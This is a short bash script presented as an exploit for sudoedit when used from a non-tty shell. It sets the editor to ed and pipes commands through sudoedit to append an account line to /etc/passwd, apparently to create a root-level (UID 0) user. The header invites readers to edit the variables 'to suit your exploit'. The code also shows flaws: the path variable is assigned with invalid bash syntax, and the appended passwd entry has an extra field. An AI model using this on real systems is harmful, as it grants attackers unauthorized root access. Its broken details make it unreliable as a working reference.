#!/bin/bash

##Author : Paranoid Ninja
##Email  : paranoidninja@protonmail.com
##Descr  : Script to exploit sudoedit files when using a non-tty shell. Modify the $APPEND variable and $PATHTOVULN to suit your exploit


SHED="/bin/ed"
APPEND="root:passwordhash:x:0:0:root:/root:/bin/bash"
$PATHTOVULN="/etc/passwd"

OLD_EDITOR=$EDITOR
export EDITOR=$SHED;

echo "a
$APPEND
.
w
q" | sudoedit $PATHTOVULN

export EDITOR=$OLD_EDITOR
